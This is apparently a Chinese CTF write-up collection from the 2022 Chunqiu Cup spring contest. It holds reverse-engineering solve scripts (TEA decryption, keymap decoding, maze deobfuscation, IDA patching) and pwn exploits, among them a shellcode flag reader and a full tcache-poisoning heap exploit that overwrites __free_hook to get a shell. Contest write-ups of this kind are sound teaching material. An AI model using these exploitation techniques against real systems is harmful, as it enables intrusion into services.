        v1 += ((v0 << 4) + k2) ^ (v0 + x) ^ ((v0 >> 5) + k3)
        v1 = v1 & 0x1ffffff
    v[0] = v0
    v[1] = v1
    return v
def tea_decrypt(v, k):
    v0 = v[0] & 0x1ffffff
    v1 = v[1] & 0x1ffffff
    x = (0x13c6a7e * 32) & 0x1ffffff
    delta = 0x13c6a7e
    k0 = (hash_value[0] & 0xfe000000) >> 25 | (hash_value[2] & 0xfe000000) >> (25 - 7)
    k1 = (hash_value[1] & 0xfe000000) >> 25 | (hash_value[3] & 0xfe000000) >> (25 - 7)
    k2 = (hash_value[2] & 0x1ffffff)
    k3 = (hash_value[3] & 0x1ffffff)
    print("0x%.8x,0x%.8x,0x%.8x,0x%.8x"%(k0,k1,k2,k3))
    for i in range(32):
        v1 -= ((v0 << 4) + k2) ^ (v0 + x) ^ ((v0 >> 5) + k3)
        v1 = v1 & 0x1ffffff
        v0 -= ((v1 << 4) + k0) ^ (v1 + x) ^ ((v1 >> 5) + k1)
        v0 = v0 & 0x1ffffff
        x -= delta
        x = x & 0x1ffffff
    v[0] = v0
    v[1] = v1
    return v

def check3_1():
    value[0] = (hash_value[0] & 0x1ffffff)^ 18151210 #Ada_Lovelace Birth
    

def hash():
    t = 0
    t &= 0x1f
    t ^= (value[0] & 0x1f00000) >> (4 * 5)
    t ^= (value[0] & 0xf8000) >> (3 * 5)
    t ^= (value[0] & 0x7c00) >> (2 * 5)
    t ^= (value[0] & 0x3e0) >> (1 * 5)
    t ^= (value[0] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (4 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[1] & 0x1f00000) >> (4 * 5)
    t ^= (value[1] & 0xf8000) >> (3 * 5)
    t ^= (value[1] & 0x7c00) >> (2 * 5)
    t ^= (value[1] & 0x3e0) >> (1 * 5)
    t ^= (value[1] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (3 * 5) 
    t = 0
    t &= 0x1f
    t ^= (value[2] & 0x1f00000) >> (4 * 5)
    t ^= (value[2] & 0xf8000) >> (3 * 5)
    t ^= (value[2] & 0x7c00) >> (2 * 5)
    t ^= (value[2] & 0x3e0) >> (1 * 5)
    t ^= (value[2] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (2 * 5) 
    t = 0

    t &= 0x1f
    t ^= (value[3] & 0x1f00000) >> (4 * 5)
    t ^= (value[3] & 0xf8000) >> (3 * 5)
    t ^= (value[3] & 0x7c00) >> (2 * 5)
    t ^= (value[3] & 0x3e0) >> (1 * 5)
    t ^= (value[3] & 0x1f) >> (0 * 5)

    print(t)
    value[4] |= t << (1 * 5)
    t = 0
    for i in range(4):
        t ^= (value[i] & 0x1f00000) >> (4 * 5)
        t ^= (value[i] & 0xf8000) >> (3 * 5)
        t ^= (value[i] & 0x7c00) >> (2 * 5)
        t ^= (value[i] & 0x3e0) >> (1 * 5)
        t ^= (value[i] & 0x1f) >> (0 * 5)
    value[4] |= t << (0 * 5)
    
def solve():
    value[0] = (hash_value[0] & 0x1ffffff)^ 18151210 #Ada_Lovelace Birth
    value[1] = (hash_value[1] & 0x1ffffff)^ (10*2**20 + 23*2**15 + 8*2**10 + 10*2**5 +17) #CRACK
    plain = [0x1852,0x1127]
    key = [0xffffffff,0xffffffff,0xffffffff,0xffffffff]
    print("0x%.8x,0x%.8x,0x%.8x,0x%.8x"%(hash_value[0],hash_value[1],hash_value[2],hash_value[3]))
    decrypted = tea_decrypt(plain, key)
    value[2],value[3] = decrypted
    
    hash()
    print("0x%.8x,0x%.8x,0x%.8x,0x%.8x,0x%.8x"%(value[0],value[1],value[2],value[3],value[4]))
    for i in range(5):
        trans(value[i])
        print("-",end='')
    

solve()

sandbox

from pwn import *

context.arch = 'amd64'
p = remote("", )

shellcode = b'xcc'
shellcode += asm(shellcraft.open("/home/chal/flag")) + asm(shellcraft.read(3, 'rsp', 0x40)) + asm(shellcraft.write(1, 'rsp', 0x40))

p.sendlineafter("?", str(len(shellcode)).encode())
p.send(shellcode)

p.interactive()

out

先通过玩迷宫造成数组溢出导致star和score>0x1000000

完成条件后触发漏洞函数，格式化字符串和IO_FILE配合达成rop，getflag

地图是一个25*25的地图，每次游戏都会初始化地图，初始化地图函数如下

地图形状如下图如示

1表示墙壁，每次游戏的出生地点是一个伪随机，可以通过id来推断出种子，需要逆向下面这个函数

而游戏本身逻辑在出口处存在漏洞，存在正常逻辑应该是v4<=0 , v5<=0;

而在内存上star和score和map数组是相邻的，通过溢出能够把star和score改成一个比较大的数字。

Star和score被修改成比较大的数字后，就可以触发后门函数，后面函数中存在格式化字符串漏洞。

Fopen可以打开/proc/self/maps来泄露内存布局，同时注意到这里fclose能间接调用free，因此这里选择劫持free_hook，同时程序自带了一个gadget可供利用。

Seccomp规则

最后利用采用栈迁移+orw来完成读取flag

Torghast
检查题目保护，发现全保护

进入IDA对程序逻辑进行逆向

发现程序存在大量判断逻辑 及 函数调用 首先定位到最外层选项

大致判断出程序的逻辑 分别跟进发现 2 / 3 选项可以进行堆内存相关的操控 但是需要满足 一个 要求

chunzhiIOT

检查题目保护，发现保护全开

使用IDA进行对程序的逆向

发现程序基本逻辑  跟进1BDC函数

发现内部包括1852和15FD函数 分别进行跟进

可以注意到1852函数 内部类似http服务相关处理函数。进行相关协议的逆向分析。

最终获得基础格式payload

payload = "POST /bin/sh HTTP1.1rn"

payload += "abc: 123rn"

payload += content  

继续进行跟进

注意到这里是对请求体进行分析的地方。

分析出首先需要发送DEV请求头 进入开发模式 才可进行后续操作。

再分别观察 当 请求头为POST时候的相关操作。可以写入有关工程日志。

注意到日志删除函数 存在Dangling Pointer 情况 。可以进行利用。

发现给到的 LIBC 是最新版本的 UBUNTU21.04 无法直接通过简单的Tcache Poisoning 进行任意地址申请。

需要对新版本的Tcache指针加密进行绕过。

首先通过

add(16,0,"0n")

show(0)

delete(0)

show(0)

的方式 泄露出来 Tcache加密数值。

泄露出来之后再构造UnsortedBin泄露一个LIBC地址

最后再攻击FREEHOOK  执行LIBC GADGET GETSHELL

exp:

from pwn import*
#p = process("./program")
p=remote("127.0.0.1","8888")
elf = ELF("./libc.so",checksec=False)
def add(size,idx,content):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(1)+"&"+str(idx)+"&"+str(size)+"&"+content+"x00"
    p.sendlineafter("Waiting Package...",payload)
def edit(idx,content):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(2)+"&"+str(idx)+"&"+content+"x00"
    p.sendlineafter("Waiting Package...",payload)
    sleep(0.1)
def show(idx):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(3)+"&"+str(idx)+"x00"
    p.sendlineafter("Waiting Package...",payload)
    sleep(0.1)
def delete(idx):
    payload = "POST /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += chr(4)+"&"+str(idx)+"x00"
    p.sendlineafter("Waiting Package...",payload)
    sleep(0.1)
def DEV():
    payload = "DEV /bin/sh HTTP1.1rn"
    payload += "abc: 123rn"
    payload += "rotartsinimdax00"
    p.sendlineafter("Waiting Package...",payload)
DEV()
add(16,0,"0n")
show(0)
delete(0)
show(0)
p.recvuntil("Content-Length:")
p.recvuntil("n")
addr1=u64(p.recv(5).ljust(8,'x00'))
addr1=addr1<<12
magic = addr1 >> 12
for i in range(8):
    add(0xb8,i+1,"0n")
add(32,9,"0n")
for i in range(8):
    delete(i+1)
edit(8,"1")
show(8)
p.recvuntil("Content-Length:")
p.recvuntil("n")
addr2 = u64(p.recv(6).ljust(8,'x00')) - 0x1E0C31
freehook = addr2 + elf.symbols['__free_hook']
edit(7,p64(freehook^magic))
payload = "/bin/shx00" + p64(addr1+0x740)*3+p64(addr2+elf.symbols['setcontext']+0x4f)
payload = payload.ljust(0x48,'a')
payload+=p64(0)*4
payload = payload.ljust(0xa8,'a')
payload += p64(addr2 + 0xde78c)
add(0xb8,10,payload)
add(0xb8,11,p64(addr2 + 0x14a0a0))
delete(10)
p.interactive()

GAME福利

为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，春秋GAME团队将春秋杯春季赛题目部署到i春秋CTF大本营的“2022年春秋杯网络安全联赛春季赛”，欢迎各位师傅交流讨论。
https://www.ichunqiu.com/competition

相关阅读

2022年春秋杯春季赛落幕，伽玛号战舰将奔赴下一星宇！

【WP】2022年春秋杯春季赛Web类题目解析

【WP】2022年春秋杯春季赛Misc、Crypto类题目解析

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群

Q群:
703460426


```
SEED = 0
KC_A = 4
KC_Z = 29
KC_1 = 30
KC_9 = 38
KC_0 = 39

def rand():
 global SEED
 SEED = 214013 * SEED + 2531011
 return (SEED >> 16) & 0x7fff

keycodeToKey = {0:'KC_NO', 1:'KC_TRANSPARENT', 2:'KC_POST_FAIL', 3:'KC_UNDEFINED', 4:'KC_A', 5:'KC_B', 6:'KC_C', 7:'KC_D', 8:'KC_E', 9:'KC_F', 10:'KC_G', 11:'KC_H', 12:'KC_I', 13:'KC_J', 14:'KC_K', 15:'KC_L', 16:'KC_M', 17:'KC_N', 18:'KC_O', 19:'KC_P', 20:'KC_Q', 21:'KC_R', 22:'KC_S', 23:'KC_T', 24:'KC_U', 25:'KC_V', 26:'KC_W', 27:'KC_X', 28:'KC_Y', 29:'KC_Z', 30:'KC_1', 31:'KC_2', 32:'KC_3', 33:'KC_4', 34:'KC_5', 35:'KC_6', 36:'KC_7', 37:'KC_8', 38:'KC_9', 39:'KC_0', 40:'KC_ENTER', 41:'KC_ESCAPE', 42:'KC_BACKSPACE', 43:'KC_TAB', 44:'KC_SPACE', 45:'KC_MINUS', 46:'KC_EQUAL', 47:'KC_LEFT_BRACKET', 48:'KC_RIGHT_BRACKET', 49:'KC_BACKSLASH', 50:'KC_NONUS_HASH', 51:'KC_SEMICOLON', 52:'KC_QUOTE', 53:'KC_GRAVE', 54:'KC_COMMA', 55:'KC_DOT', 56:'KC_SLASH', 57:'KC_CAPS_LOCK', 58:'KC_F1', 59:'KC_F2', 60:'KC_F3', 61:'KC_F4', 62:'KC_F5', 63:'KC_F6', 64:'KC_F7', 65:'KC_F8', 66:'KC_F9', 67:'KC_F10', 68:'KC_F11', 69:'KC_F12', 70:'KC_PRINT_SCREEN', 71:'KC_SCROLL_LOCK', 72:'KC_PAUSE', 73:'KC_INSERT', 74:'KC_HOME', 75:'KC_PAGE_UP', 76:'KC_DELETE', 77:'KC_END', 78:'KC_PAGE_DOWN', 79:'KC_RIGHT', 80:'KC_LEFT', 81:'KC_DOWN', 82:'KC_UP', 83:'KC_NUM_LOCK', 84:'KC_KP_SLASH', 85:'KC_KP_ASTERISK', 86:'KC_KP_MINUS', 87:'KC_KP_PLUS', 88:'KC_KP_ENTER', 89:'KC_KP_1', 90:'KC_KP_2', 91:'KC_KP_3', 92:'KC_KP_4', 93:'KC_KP_5', 94:'KC_KP_6', 95:'KC_KP_7', 96:'KC_KP_8', 97:'KC_KP_9', 98:'KC_KP_0', 99:'KC_KP_DOT', 100:'KC_NONUS_BACKSLASH', 101:'KC_APPLICATION', 102:'KC_KB_POWER', 103:'KC_KP_EQUAL', 104:'KC_F13', 105:'KC_F14', 106:'KC_F15', 107:'KC_F16', 108:'KC_F17', 109:'KC_F18', 110:'KC_F19', 111:'KC_F20', 112:'KC_F21', 113:'KC_F22', 114:'KC_F23', 115:'KC_F24', 116:'KC_EXECUTE', 117:'KC_HELP', 118:'KC_MENU', 119:'KC_SELECT', 120:'KC_STOP', 121:'KC_AGAIN', 122:'KC_UNDO', 123:'KC_CUT', 124:'KC_COPY', 125:'KC_PASTE', 126:'KC_FIND', 127:'KC_KB_MUTE', 128:'KC_KB_VOLUME_UP', 129:'KC_KB_VOLUME_DOWN', 130:'KC_LOCKING_CAPS_LOCK', 131:'KC_LOCKING_NUM_LOCK', 132:'KC_LOCKING_SCROLL_LOCK', 133:'KC_KP_COMMA', 134:'KC_KP_EQUAL_AS400', 135:'KC_INTERNATIONAL_1', 136:'KC_INTERNATIONAL_2', 137:'KC_INTERNATIONAL_3', 138:'KC_INTERNATIONAL_4', 139:'KC_INTERNATIONAL_5', 140:'KC_INTERNATIONAL_6', 141:'KC_INTERNATIONAL_7', 142:'KC_INTERNATIONAL_8', 143:'KC_INTERNATIONAL_9', 144:'KC_LANGUAGE_1', 145:'KC_LANGUAGE_2', 146:'KC_LANGUAGE_3', 147:'KC_LANGUAGE_4', 148:'KC_LANGUAGE_5', 149:'KC_LANGUAGE_6', 150:'KC_LANGUAGE_7', 151:'KC_LANGUAGE_8', 152:'KC_LANGUAGE_9', 153:'KC_ALTERNATE_ERASE', 154:'KC_SYSTEM_REQUEST', 155:'KC_CANCEL', 156:'KC_CLEAR', 157:'KC_PRIOR', 158:'KC_RETURN', 159:'KC_SEPARATOR', 160:'KC_OUT', 161:'KC_OPER', 162:'KC_CLEAR_AGAIN', 163:'KC_CRSEL', 164:'KC_EXSEL', 224:'KC_LEFT_CTRL', 225:'KC_LEFT_SHIFT', 226:'KC_LEFT_ALT', 227:'KC_LEFT_GUI', 228:'KC_RIGHT_CTRL', 229:'KC_RIGHT_SHIFT', 230:'KC_RIGHT_ALT', 231:'KC_RIGHT_GUI'}

keymaps = [0x0029, 0x0000, 0x003A, 0x003B, 0x003C, 0x003D, 0x0000, 0x003E, 
    0x003F, 0x0040, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 
    0x0047, 0x0048, 0x0035, 0x001E, 0x001F, 0x0020, 0x0021, 0x0022, 
    0x0023, 0x0024, 0x0025, 0x0026, 0x0027, 0x002D, 0x002E, 0x002A, 
    0x0000, 0x0049, 0x004A, 0x004B, 0x002B, 0x0000, 0x0014, 0x001A, 
    0x0008, 0x0015, 0x0017, 0x001C, 0x0018, 0x000C, 0x0012, 0x0013, 
    0x002F, 0x0030, 0x0031, 0x004C, 0x004D, 0x004E, 0x0039, 0x0000, 
    0x0004, 0x0016, 0x0007, 0x0009, 0x000A, 0x000B, 0x000D, 0x000E, 
    0x000F, 0x0033, 0x0034, 0x0028, 0x0000, 0x0000, 0x0000, 0x0000, 
    0x0000, 0x00E1, 0x001D, 0x001B, 0x0006, 0x0019, 0x0005, 0x0011, 
    0x0010, 0x0036, 0x0037, 0x0038, 0x0000, 0x00E5, 0x0000, 0x0000, 
    0x0052, 0x0000, 0x00E0, 0x00E3, 0x0000, 0x00E2, 0x0000, 0x0000, 
    0x002C, 0x0000, 0x0000, 0x0000, 0x00E6, 0x00E7, 0x0000, 0x0065, 
    0x00E4, 0x0050, 0x0051, 0x004F, 0x0029, 0x0000, 0x003A, 0x003B, 
    0x003C, 0x003D, 0x0000, 0x003E, 0x003F, 0x0040, 0x0041, 0x0042, 
    0x0043, 0x0044, 0x0045, 0x0046, 0x0047, 0x0048, 0x0035, 0x0012, 
    0x0013, 0x000D, 0x0020, 0x001B, 0x0016, 0x000E, 0x0005, 0x0011, 
    0x001A, 0x002D, 0x002E, 0x002A, 0x0000, 0x0049, 0x004A, 0x004B, 
    0x002B, 0x0000, 0x0015, 0x000A, 0x0027, 0x0022, 0x0009, 0x0018, 
    0x0024, 0x0023, 0x0017, 0x0006, 0x002F, 0x0030, 0x0031, 0x004C, 
    0x004D, 0x004E, 0x0039, 0x0000, 0x0007, 0x0004, 0x0010, 0x000C, 
    0x0019, 0x0008, 0x001C, 0x0014, 0x000F, 0x0033, 0x0034, 0x0028, 
    0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x00E1, 0x001F, 0x000B, 
    0x001E, 0x0025, 0x001D, 0x0026, 0x0021, 0x0036, 0x0037, 0x0038, 
    0x0000, 0x00E5, 0x0000, 0x0000, 0x0052, 0x0000, 0x00E0, 0x00E3, 
    0x0000, 0x00E2, 0x0000, 0x0000, 0x002C, 0x0000, 0x0000, 0x0000, 
    0x00E6, 0x00E7, 0x0000, 0x0065, 0x00E4, 0x0050, 0x0051, 0x004F, 
    0x0029, 0x0000, 0x003A, 0x003B, 0x003C, 0x003D, 0x0000, 0x003E, 
    0x003F, 0x0040, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 
    0x0047, 0x0048, 0x0035, 0x0001, 0x0001, 0x0001, 0x0001, 0x0001, 
    0x0001, 0x0001, 0x0001, 0x0001, 0x0001, 0x002D, 0x002E, 0x002A, 
    0x0000, 0x0049, 0x004A, 0x004B, 0x002B, 0x0000, 0x0025, 0x0004, 
    0x0023, 0x0015, 0x0008, 0x001D, 0x0019, 0x001F, 0x0006, 0x0027, 
    0x002F, 0x0030, 0x0031, 0x004C, 0x004D, 0x004E, 0x0039, 0x0000, 
    0x0010, 0x0007, 0x000F, 0x0009, 0x0021, 0x0022, 0x001E, 0x0026, 
    0x000B, 0x0033, 0x0034, 0x0028, 0x0000, 0x0000, 0x0000, 0x0000, 
    0x0000, 0x00E1, 0x0018, 0x001C, 0x0024, 0x0014, 0x0017, 0x000C, 
    0x000A, 0x0036, 0x0037, 0x0038, 0x0000, 0x00E5, 0x0000, 0x0000, 
    0x0052, 0x0000, 0x00E0, 0x00E3, 0x0000, 0x00E2, 0x0000, 0x0000, 
    0x002C, 0x0000, 0x0000, 0x0000, 0x00E6, 0x00E7, 0x0000, 0x0065, 
    0x00E4, 0x0050, 0x0051, 0x004F]

LayerMap = [dict(), dict(), dict()]

def buildLayerMap(layer):
 for i in range(108):
  curr_keycode = keymaps[layer * 108 + i]
  if curr_keycode == 1: # KC_TRANSPARENT
   curr_keycode = keymaps[(layer - 1) * 108 + i]
  LayerMap[layer][ keycodeToKey[ curr_keycode ] ] = keycodeToKey[ keymaps[i] ]

def formatLayer():
    for layer in range(0, 3):
        for col in range(6):
            for row in range(18):
                print(keycodeToKey[ keymaps[layer * 108 + col * 18 + row] ].ljust(15),end=',')
            print()
        print()
        
formatLayer()
buildLayerMap(1)
buildLayerMap(2)
SEED = rand()
sum = 0
enc = "1CTED8IL-BIMM-SMFP-HOKP-HOIDRZL4W6KR"
Table = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
flag = ""

for i in range(36):
 rand()
 Layer_stat = (i // 18) + 1
 if enc[i] in Table:
  if Layer_stat == 1:
   keycode = Table.index(enc[i]) - (rand() % 36)
   if keycode < KC_A:
    keycode += 36
   sum += keycode
  else:
   keycode = Table.index(enc[i]) + (sum % 40)
   if keycode > KC_0:
    keycode -= 36
   sum += keycode
  flag += LayerMap[ Layer_stat ][ keycodeToKey[keycode] ][3:]
 else:
  flag += enc[i]

print("flag{" + flag + "}")
python3 deflat.py -f ./ezam --addr 0x4008F0
python3 deflat.py -f ./ezam_recovered --addr 0x400670
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned __int8 ii; // [rsp+197h] [rbp-2A9h]
  __int16 v5; // [rsp+198h] [rbp-2A8h]
  unsigned __int8 n; // [rsp+19Ah] [rbp-2A6h]
  char m; // [rsp+19Bh] [rbp-2A5h]
  int v8; // [rsp+19Ch] [rbp-2A4h]
  unsigned __int8 l; // [rsp+1A2h] [rbp-29Eh]
  unsigned __int8 k; // [rsp+1A3h] [rbp-29Dh]
  unsigned int v11; // [rsp+1A4h] [rbp-29Ch]
  unsigned int v12; // [rsp+1A8h] [rbp-298h]
  unsigned int v13; // [rsp+1ACh] [rbp-294h]
  unsigned __int8 j; // [rsp+1B2h] [rbp-28Eh]
  unsigned __int8 i; // [rsp+1B3h] [rbp-28Dh]
  int v16; // [rsp+1B4h] [rbp-28Ch]
  __int64 v17[2]; // [rsp+1C0h] [rbp-280h] BYREF
  int v18[12]; // [rsp+1D0h] [rbp-270h] BYREF
  int v19[12]; // [rsp+200h] [rbp-240h] BYREF
  char v20[384]; // [rsp+230h] [rbp-210h] BYREF
  char v21[48]; // [rsp+3B0h] [rbp-90h] BYREF
  char v22[32]; // [rsp+3E0h] [rbp-60h] BYREF
  char s[40]; // [rsp+400h] [rbp-40h] BYREF
  int v24; // [rsp+428h] [rbp-18h]
  int v25; // [rsp+42Ch] [rbp-14h]

  v24 = 0;
  memset(s, 0, 0x22uLL);
  memset(v22, 0, 0x1BuLL);
  memset(v21, 0, 0x2DuLL);
  printf("Give me a flag, and I will give you a flag if it is a flag.n");
  __isoc99_scanf("%33s", s);
  memset(v20, 0, sizeof(v20));
  memcpy(v19, &unk_401C50, sizeof(v19));
  memcpy(v18, &unk_401C80, sizeof(v18));
  qmemcpy(v17, "#39C5BB_i5_b3st!", sizeof(v17));
  v16 = 0;
  for ( i = 0; i < 0xCu; ++i )
    v16 = ~v18[i] & v16 | ~v16 & v18[i];
  for ( j = 0; j < 0xCu; j += 2 )
  {
    v13 = v19[j];
    v12 = v19[j + 1];
    v11 = 32 * v16;
    for ( k = 0; k < 0x20u; ++k )
    {
      v12 -= ~(*((_DWORD *)v17 + ~(~(v11 >> 11) | 0xFFFFFFFC)) + v11) & ((~(v13 >> 5) & (16 * v13) | ~(16 * v13) & (v13 >> 5))
                                                                       + v13) | ~((~(v13 >> 5) & (16 * v13) | ~(16 * v13) & (v13 >> 5))
                                                                                + v13) & (*((_DWORD *)v17
                                                                                          + ~(~(v11 >> 11) | 0xFFFFFFFC))
                                                                                        + v11);
      v11 -= v16;
      v13 -= ((*((_DWORD *)v17 + ~(~v11 | 0xFFFFFFFC)) + v11) & 0x567848F6 | ~(*((_DWORD *)v17 + ~(~v11 | 0xFFFFFFFC))
                                                                             + v11) & 0xA987B709) ^ (((~(v12 >> 5) & (16 * v12) | ~(16 * v12) & (v12 >> 5)) + v12) & 0x567848F6 | ~((~(v12 >> 5) & (16 * v12) | ~(16 * v12) & (v12 >> 5)) + v12) & 0xA987B709);
    }
    v19[j] = v13;
    v19[j + 1] = v12;
  }
  for ( l = 0; l < 0xCu; ++l )
  {
    v8 = v19[l];
    for ( m = 31; m >= 0; --m )
      v20[31 - -32 * l - m] = ~(~(1 << m) | (unsigned int)~v8) >> m;
  }
  if ( !memcmp(s, "flag{", 5uLL) && s[32] == 125 )
  {
    for ( n = 5; n < 0x20u; ++n )
    {
      if ( s[n] >= 58 || s[n] <= 47 )
        goto LABEL_43;
      v22[n - 5] = s[n] - 48;
    }
    sub_400670(v22, v21, 4LL, 2543397061LL);
    v5 = 0;
    for ( ii = 0; ii < 0x2Du; ++ii )
    {
      v25 = (unsigned __int8)v21[ii];
      if ( v25 < 2 )
      {
        if ( v25 >= 1 )
          --v5;
        else
          v5 -= 100;
      }
      else if ( v25 < 3 )
      {
        v5 += 100;
      }
      else if ( v25 == 3 )
      {
        ++v5;
      }
      if ( v5 == 823 )
      {
        printf("W0W, your flag is what your input!n");
        return 0;
      }
      if ( v5 < 0 || v5 % 100 > 23 || v5 / 100 > 15 || !v20[v5 % 100 - -24 * (v5 / 100)] )
        break;
    }
  }
LABEL_43:
  printf("Err0rn");
  return 1;
}
__int64 __fastcall sub_400670(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  __int64 result; // rax
  unsigned __int8 i; // [rsp+36h] [rbp-16h]
  char v6; // [rsp+37h] [rbp-15h]
  char v7; // [rsp+38h] [rbp-14h]
  unsigned __int8 v8; // [rsp+38h] [rbp-14h]
  unsigned __int8 v9; // [rsp+39h] [rbp-13h]
  unsigned __int8 v10; // [rsp+3Ah] [rbp-12h]

  v10 = 45;
  v9 = 0;
  while ( 1 )
  {
    result = 2650420955LL;
    if ( !v10-- )
      break;
    v7 = 0;
    v6 = 0;
    for ( i = v9; i < 0x1Bu; ++i )
    {
      v8 = *(_BYTE *)(a1 + i) - -10 * v7;
      *(_BYTE *)(a1 + i) = v8 / (__int16)a3;
      v7 = v8 % (__int16)a3;
      if ( !v6 )
      {
        if ( *(_BYTE *)(a1 + i) )
        {
          v9 = i;
          v6 = 1;
        }
      }
    }
    *(_BYTE *)(a2 + v10) = v7;
  }
  return result;
}
~a & b | ~b & a  // == a ^ b
~(~a | ~b)       // == a & b
//....
line 37-38: 生成v16
line 39-57: XTEA解密
line 58-63: 把XTEA解密后的每个数据（32bits）按照大端二进制（4*8个）填入map中
line 66-72: 处理输入数据，从ASCII码转换到对应数字，再通过sub_400670进行十进制到四进制的转换（大整数的进制转换，使用数组模拟）
line 73-99: 走16*24迷宫，判断（v5代表在迷宫中的位置，以十进制xxyy表示）：有无出界、当前位置是否可走（1可走，0不可走），到终点（823，即map[8][23]）则判断正确；0代表上，1代表左，2代表下，3代表右
mymap = [1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]
for i in range(16):
    strmap = ""
    for j in range(24):
        if mymap[i*24+j] == 1:
            strmap += '.'
        else:
            strmap += '*'
    print(strmap)
__packed_struct(l_info)     // 12-byte trailer in header for loader
        TE32 l_checksum;
        LE32 l_magic;
        TE16 l_lsize;
        unsigned char l_version;
        unsigned char l_format;
    __packed_struct_end()
from keystone import *

# 文件架构
ks = Ks(KS_ARCH_X86, KS_MODE_64)

# 用于混淆的全局变量地址始末
start = 0x604064
end = 0x604090

def my_patch(ea):
  new_asm = (GetDisasm(ea).split(',')[0] + ', 0').encode()
  patchbytes, count = ks.asm(new_asm)
  patchbytes = bytes(patchbytes)
  if len(patchbytes) < get_item_size(ea):
      nop_len = get_item_size(ea) - len(patchbytes)
      ida_bytes.patch_bytes(ea, patchbytes + b'x90'*nop_len)
      print(new_asm, patchbytes)
  else:
      print("[-]REEOR: more bytes in new ins at 0x" + hex(ea))

for addr in range(start, end+1, 4):
  print(hex(addr).center(20,'-'))
  ref = ida_xref.get_first_dref_to(addr)
  # 获取所有交叉引用
  while(ref != ida_idaapi.BADADDR):
      my_patch(ref)
      ref = ida_xref.get_next_dref_to(addr, ref)
import base64
import re

# 填出来的数织答案
v27 = "0000000000000000000000000000000010000000000000000001110000000000000000111110000000000000111111110000000000011111111100000000001111111111100000000000111111100000000000000000000000000111111111111110000011100000000011110000111000000000111111100111111111111111000000000000000000000000000000111111100000000000001111111000000000000111111110000000000001111111000000000000000000000000000000000000000000000000"

# 按照0或1的连续长度进行压缩
tmpl = re.findall(r'0+|1+', v27)
v24 = bytes([len(x) for x in tmpl])

# 拿到base64的新表
unk_403040 = [0x0C, 0xFF, 0xFF, 0xFF, 0x22, 0x2C, 0x25, 0x05, 0x1E, 0x1F, 0x34, 0x1D, 0x39, 0x30, 0x15, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x2B, 0x14, 0x2D, 0x00, 0x10, 0x02, 0x11, 0x03, 0x37, 0x29, 0x33, 0x3B, 0x2E, 0x24, 0x2F, 0x20, 0x0A, 0x3D, 0x3F, 0x07, 0x08, 0x17, 0x0D, 0x28, 0x27, 0x26, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x35, 0x2A, 0x3A, 0x13, 0x18, 0x3E, 0x31, 0x38, 0x21, 0x01, 0x12, 0x0B, 0x32, 0x04, 0x06, 0x19, 0x09, 0x3C, 0x1B, 0x0E, 0x1C, 0x36, 0x0F, 0x16, 0x1A, 0x23]
mytable = [0 for _ in range(64)]
for x in unk_403040:
    if x != 0xFF:
        mytable[x] = chr(unk_403040.index(x)+43)
mytable = ''.join(mytable)
# 换表encode
b64table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
s = base64.b64encode(v24)
